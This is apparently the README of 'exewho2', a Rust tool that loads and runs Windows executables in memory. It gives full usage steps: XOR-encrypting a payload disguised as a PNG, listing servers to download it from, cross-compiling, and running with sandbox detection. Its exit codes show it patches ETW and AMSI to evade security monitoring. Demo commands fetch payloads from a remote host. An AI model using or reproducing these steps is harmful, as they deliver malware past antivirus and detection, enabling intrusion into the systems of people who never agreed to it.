# exewho2
ExeWho on steroids

## Preparing an executable
Once you have the payload EXE, you can use the `scripts/parser.py` script to "prepare" it for the `exewho2` binary.
The script does two things:

- XOR encrypts the payload
- Adds a PNG header to the encrypted payload

You can run the script as:
```bash
$ python3 scripts/parser.py --key abcdefghiojkl /path/to/payload.exe
```
This creates a file: `/path/to/payload.exe.png` which can then be fed into the JSON payload.

## Creating JSON

A list of servers to fetch the actual payload from can be achieved by creating a JSON as follows(see `server_demo.json`):

```json
{
    "servers": [
        "http://192.168.0.107:8000/test1.exe.png",
        "http://192.168.0.107:8000/test.exe.png"
    ]
}
```
A list of servers can be specified as shown and the program iterates through the list till it finds a valid response

## Compiling the executable

On Linux, make sure you have the `x86_64-pc-windows-gnu` toolchain

```bash
$ rustup target add x86_64-pc-windows-gnu
```

The you can compile using

```bash
$ cargo build --target "x86_64-pc-windows-gnu" # For DEBUG Builds
$ cargo build --target "x86_64-pc-windows-gnu" --release # For Release Builds
```

## Running the payload

You can get a list of available options with:

```
Run executables in Memory, but better!

Usage: exewho2.exe [OPTIONS] --url <url>

Options:
  -u, --url <url>      URL to fetch Server Listings from
      --ds             Try to detect if loader is in a Sandbox
  -k, --key <dec_key>  Key for decrypting incoming stream(if encrypted)
  -h, --help           Print help
```

A demo run would look like:
```
exewho2.exe -u http://192.168.0.107:8000/server.json --ds --key abcdefghiojkl
```

![](./image.png)

> Note the if the `--ds` option is specified, the program exits on sandbox detection

## Exit Codes 
| Exit Code | Description |
| :--------:| :-------------:|
| -1 |  Failed to patch ETW |
| -2 | Failed to patch AMSI | 
| -3 | Sandbox Detected |
| -4 | Failed to fetch CLI Args |
| -5 | Invalid PE file |
| -6 | Failed to execute payload |

## Notes
- Make sure all domain names in the JSON are in lowercase. Eg:
    - Valid:    http://mysuspiciousdomain.com
    - Invalid:  http://MysuspiciousDomain.com